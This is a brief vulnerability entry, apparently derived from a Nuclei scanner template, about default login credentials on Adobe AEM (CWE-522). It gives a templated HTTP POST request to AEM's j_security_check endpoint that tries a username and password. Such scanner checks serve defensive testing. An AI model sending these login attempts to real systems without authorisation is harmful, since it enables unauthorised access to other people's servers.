# Vulnerability: Adobe AEM Default Login
**Classification:** CWE-522
**Source:** Nuclei Template (`aem-default-login.yaml`)

## Description
Adobe AEM default login credentials were discovered.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /libs/granite/core/content/login.html/j_security_check HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: {{BaseURL}}
Referer: {{BaseURL}}/libs/granite/core/content/login.html

_charset_=utf-8&j_username={{aem_user}}&j_password={{aem_pass}}&j_validate=true
```

